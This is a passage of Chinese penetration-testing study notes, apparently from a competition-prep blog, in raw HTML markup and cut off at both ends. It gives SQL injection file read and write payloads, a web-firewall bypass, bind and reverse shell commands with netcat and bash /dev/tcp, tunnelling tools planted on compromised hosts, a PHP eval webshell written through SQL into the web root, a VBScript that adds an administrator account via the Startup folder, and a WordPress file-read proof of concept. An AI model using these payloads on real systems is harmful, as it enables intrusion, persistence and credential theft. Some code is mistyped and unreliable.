keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;D://phpStudy//WWW//nvhack.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x27443A2F2F70687053747564792F2F5757572F2F6E766861636B2E706870&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;@@datadir&lt;/code&gt;  读取数据库路径&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;@@basedir&lt;/code&gt; MYSQL 安装路径&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;@@version_compile_os&lt;/code&gt;  操作系统 Windows Server 2003&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;into_outfile() / into outfile()&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前提:
&lt;ul&gt;
&lt;li&gt;文件名必须全路径 (绝对路径)，&lt;/li&gt;
&lt;li&gt;用户必须有写文件的权限&lt;/li&gt;
&lt;li&gt;没有对 &#39; 单引号过滤&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT&#39;&#39; into outfile &#39;D://phpStudy//WWW//hack.php&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;concat(str1,str2,...)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;concat_ws(separator,str1,str2,...)&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表示 concat with separator，即有分隔符的字符串连接，和 concat 类似，但可以直接确定字符串连接的分隔符 如 &lt;code&gt;concat_ws (0x23,&#34;test1&#34;,&#34;test2&#34;,&#34;test3&#34;), 得到 &#34;test1#test2#test3&#34;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;group_concat()&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;使用内联注释绕过安全狗&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用内联注释绕过安全狗&#34;&gt;#&lt;/a&gt; 使用内联注释绕过安全狗&lt;/h2&gt;
&lt;p&gt;如 &lt;code&gt;?id=1 union select 1,2,3,4,5&lt;/code&gt;  这样会被拦截&lt;/p&gt;
&lt;p&gt;将其改为 &lt;code&gt;?id=1 /*!50001union*/ /*!50001select*/ 1,2,3,4,5&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果使用 &lt;code&gt;and&lt;/code&gt; ，可将 &lt;code&gt;and&lt;/code&gt;  修改为 &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; ，即 &lt;code&gt;%26%26&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;28-内网转发基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#28-内网转发基础&#34;&gt;#&lt;/a&gt; 2.8 内网转发基础&lt;/h1&gt;
&lt;p&gt;使用 Socks 协议，由于不支持 SMT&lt;/p&gt;
&lt;p&gt;在 nmap 扫描时，需要有参数  &lt;code&gt;-Pn -sT&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;正向代理和反向代理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#正向代理和反向代理&#34;&gt;#&lt;/a&gt; 正向代理和反向代理&lt;/h2&gt;
&lt;p&gt;** 正向代理：** 客户端主动向代理发送一个请求，然后代理向服务器转交请求并将获取的内容返回给客户端&lt;/p&gt;
&lt;p&gt;** 反向代理：** 一般是代理服务器主动将获取的资源流量转发到客户端，让客户端接收&lt;/p&gt;
&lt;h2 id=&#34;netcatnc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netcatnc&#34;&gt;#&lt;/a&gt; NetCat/nc&lt;/h2&gt;
&lt;h3 id=&#34;用法参数-简略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用法参数-简略&#34;&gt;#&lt;/a&gt; 用法参数 (简略)&lt;/h3&gt;
&lt;p&gt;-l 开启监听 -p 指定端口 -t 以 telnet 形式应答 -e 程序重定向&lt;/p&gt;
&lt;p&gt;-n 以数字形式表示 -vv 显示详细信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -v ip port&lt;/code&gt;  探测 port 端口是否打开&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -vv ip port &amp;lt; file_path&lt;/code&gt;  提交指定文件内的数据包到 ip 的 port 端口&lt;/p&gt;
&lt;h3 id=&#34;正向代理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#正向代理&#34;&gt;#&lt;/a&gt; 正向代理&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;代理端：&lt;/strong&gt; &lt;code&gt;nc -l -p 111 -t -e cmd.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;客户端&lt;/strong&gt;： &lt;code&gt;nc -nvv ip port(111)&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;反向代理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反向代理&#34;&gt;#&lt;/a&gt; 反向代理&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;客户端&lt;/strong&gt;：  &lt;code&gt;nc -lvnp port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;代理端：&lt;/strong&gt;  &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;常用内网转发工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用内网转发工具&#34;&gt;#&lt;/a&gt; 常用内网转发工具&lt;/h2&gt;
&lt;h3 id=&#34;netsh&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netsh&#34;&gt;#&lt;/a&gt; netsh&lt;/h3&gt;
&lt;p&gt;netsh 是 Windows 自带的命令行脚本工具，它允许从本地或远程显示或修改当前正在运行的计算机的网络配置，它基于 Socket 协议，&lt;/p&gt;
&lt;p&gt;我们可以利用 netsh 进行端口转发&lt;/p&gt;
&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netsh interface portproxy add v4tov4 listenaddress = 客户端 ip (转发) listenport=666 (转发到的端口) connectaddress = 要转发的 ip (内网) connectport = 转发端口&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;查看转发&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netsh interface portproxy show all&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;删除&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netsh interface portproxy delete v4tov4 listenaddress=ip listenport=port&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;lcx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lcx&#34;&gt;#&lt;/a&gt; Lcx&lt;/h3&gt;
&lt;h4 id=&#34;正向转发&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#正向转发&#34;&gt;#&lt;/a&gt; 正向转发&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;lcx -tran port1 ip port2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;即将 ip 的端口 port2 转发到本机的端口 port1 上&lt;/p&gt;
&lt;h4 id=&#34;反向转发&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反向转发&#34;&gt;#&lt;/a&gt; 反向转发&lt;/h4&gt;
&lt;p&gt;** 代理端：**lcx -slave 转发到的 ip 转发到的端口 port 转发 ip 转发端口&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本地&lt;/strong&gt;：lcx listen 666 777&lt;/p&gt;
&lt;p&gt;将 666 端口接收到的流量转 777 端口&lt;/p&gt;
&lt;p&gt;本地访问 127.0.0.1:777（或者转为转发到的 ip）&lt;/p&gt;
&lt;p&gt;转 777 端口的原因：666 端口已经用来接收流量，不能访问，因此需要再转&lt;/p&gt;
&lt;h3 id=&#34;ssock&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssock&#34;&gt;#&lt;/a&gt; sSock&lt;/h3&gt;
&lt;h4 id=&#34;proxychains&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#proxychains&#34;&gt;#&lt;/a&gt; proxychains&lt;/h4&gt;
&lt;p&gt;Linux 下的代理工具，可以使任何程序通过代理上网 &lt;code&gt;/etc/proxychains.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Windows 下可以用 Proxifier&lt;/p&gt;
&lt;h4 id=&#34;sockscap64&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sockscap64&#34;&gt;#&lt;/a&gt; sockscap64&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc29ja3NjYXA2NC5jb20vemgtaGFucy9ob21lcGFnZS8=&#34;&gt;https://www.sockscap64.com/zh-hans/homepage/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;客户端:&lt;/strong&gt;  &lt;code&gt;./rcsocks -l 9999 -p 1080 -vv (9999 为本地提供服务 (访问) 端口)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;代理端:&lt;/strong&gt;  &lt;code&gt;./rssocks -vv -s 客户端 ip:1080&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;ew&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ew&#34;&gt;#&lt;/a&gt; EW&lt;/h3&gt;
&lt;p&gt;EW 是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以 “正向”、“反向” 、“多级级联” 等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、 Windows.MacOS、Arm-Linux 均被包括其内，强烈推荐使用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ew 正向代理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;代理端（中间机，可以访问内网机器）:・ew.exe -S ssocksd -l 1080・&lt;/p&gt;
&lt;p&gt;客户端：设置代理服务器 IP，端口 1080&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ew 反向代理&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;首先在攻击机执行命令:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ew.exe -s rcsocks -| 888 -e 777&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;意思是将物理机 888 端口的流量都转到本地端口 777_上。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接着在在中间机（可以访问内网）中执行:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ew.exe -s rssocks -d 192.168.11.248 (攻击机 ip) -e 777&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;意思是将目标机的流量全部转到 192.168.11.248:777 端口&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最后在 sockscap64 中设置代理 127.0.0.1:888 端口即可 / 或者 proxychains 修改 proxychains.conf 配置文件&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;regeorg&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#regeorg&#34;&gt;#&lt;/a&gt; reGeorg&lt;/h3&gt;
&lt;p&gt;web 代理工具&lt;/p&gt;
&lt;p&gt;基于 python，利用 PHP 创建的代理&lt;/p&gt;
&lt;p&gt;用于端口映射环境，流量只通过 http 传输&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;我们首先将 reGeorg 文件夹上传至肉鸡的网站目录下，然后访问对应脚本。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;192.1 68.20.128/r/tunnel.nosocket.php (或者也可以使用 tunnel.php)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;显示 Georg says, All seems fine 字样则代表成功。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注意，工具目录下有各种脚本，网站是什么脚本，则访问对应脚本类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接下来在攻击机执行如下脚本 (需要 urlib3 模块) :&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python reGeorgSocksProxy.py -p 8888 -u http://192.168 .20.128/r/tunnel.nosocket.php&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最后设置 proxifier 代理为 127.0.0.1:8888，即可。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;29-综合渗透之溢出提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#29-综合渗透之溢出提权&#34;&gt;#&lt;/a&gt; 2.9 综合渗透之溢出提权&lt;/h1&gt;
&lt;h2 id=&#34;写木马获取-webshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写木马获取-webshell&#34;&gt;#&lt;/a&gt; 写木马获取 webshell&lt;/h2&gt;
&lt;p&gt;通过弱密码登陆 phpadmin，利用 &lt;code&gt;into outfile &#34;&#34;&lt;/code&gt;  写一句话木马&lt;/p&gt;
&lt;p&gt;(或者创建表写入一句话木马)&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;mysql&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;darkmoon&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;darkmoon1&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TEXT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;NOT&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;mysql&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;darkmoon (&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;darkmoon1&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;) VALUES (&#39;&amp;lt;?php @eval($_POST[pass]);?&amp;gt;&#39;);&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;SELECT &lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;darkmoon1&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt; FROM &lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;darkmoon&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt; INTO OUTFILE &#39;d:/phps tudy/www/test.php&#39; ;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;DROP TABLE IF EXISTS &lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;darkmoon&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;Create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; moon &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;darkmoon &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;NOT&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;Insert&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; moon &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;darkmoon&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?php @eval($_POST[pass]);?&amp;gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; darkmoon &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; moon &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;d:/phpstudy/www/test.php&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;Drop&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;EXISTS&lt;/span&gt; moon&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;利用脚本添加用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用脚本添加用户&#34;&gt;#&lt;/a&gt; 利用脚本添加用户&lt;/h2&gt;
&lt;p&gt;写入成功获取到 webshell 后，&lt;/p&gt;
&lt;p&gt;目的是登录目标服务器，所以需要获取当前用户密码或者添加账户&lt;/p&gt;
&lt;p&gt;这里的想法是尝试给目标服务器的启动目录写一个脚本，然后设法使其重启，运行脚本，获得权限&lt;/p&gt;
&lt;p&gt;user.vbs&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vbscript&#34;&gt;set wsnetwork=Create0bject (&#34;WSCRIPT.NEIWORK&#34;)
os=&#34;WinNT://&#34;&amp;amp;wsnetwork.ComputerName
Set ob=Get0bject(os)&#39; 得到adsi接口,绑定
Set oe=Get0bject(os&amp;amp;&#34;/Administrators,group&#34;)&#39;属性, admin组
Set od=ob.Create(&#34;user&#34;, &#34;test&#34;)&#39;建立用户
od.SetPassword 123456+abc*&#34; &#39;设置密码
od.SetInfo&#39;保存
Set of=Get0bject(os&amp;amp;&#34;/test&#34; , user)&#39;得到用户
oe.add os&amp;amp;&#34;/test&#34;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;先将该文件上传到网站的根目录 (这里为 &lt;code&gt;d:\\phpStudy\\WWW&lt;/code&gt; ), 然后利用数据库的 root 权限侠士写文件到启动目录下&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;d:\\phpStudy\\WWW\\user.vbs&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;dumpfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;c:/docume~1/alluse~1/「开始」菜单/程序/启动/user.vbs&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;之后利用漏洞 MS12-020 使其蓝屏自动重启 (可使用 nessus 扫描漏洞)&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=&#34;&gt;exp 的下载&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;210-铁三真题解析之企业赛真题解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#210-铁三真题解析之企业赛真题解析&#34;&gt;#&lt;/a&gt; 2.10 铁三真题解析之企业赛真题解析&lt;/h1&gt;
&lt;h2 id=&#34;wordpress&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wordpress&#34;&gt;#&lt;/a&gt; wordpress&lt;/h2&gt;
&lt;h3 id=&#34;wp-hide-security-enhancer-文件下载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wp-hide-security-enhancer-文件下载&#34;&gt;#&lt;/a&gt; WP Hide Security Enhancer 文件下载&lt;/h3&gt;
&lt;p&gt;Hide Security Enhancer 作为防护 WP Scan 的插件，有着查看文件的漏洞，只能查看，不能获取 webshell&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Poc：&lt;/strong&gt; &lt;code&gt;/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&amp;amp;file_path=/wp-config.php&lt;/code&gt;  其中 &lt;code&gt;wp-config.php&lt;/code&gt;  可以输入任意文件来读取下载&lt;/p&gt;
&lt;h3 id=&#34;wp-mailer-命令执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wp-mailer-命令执行&#34;&gt;#&lt;/a&gt; WP mailer 命令执行&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;CVE-2016-1033 RCE 漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;影响 wordpress4.6 版本 =&amp;gt; pgpmailer 5.2.14&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;phpmailer &amp;lt; 5.2.18 RCE AVE-2016-10033&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;环境 Ubuntu exim4&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;原理&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 在源代码中&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$sitename&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;SERVER_NAME&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$from_email&lt;/span&gt; &lt;span 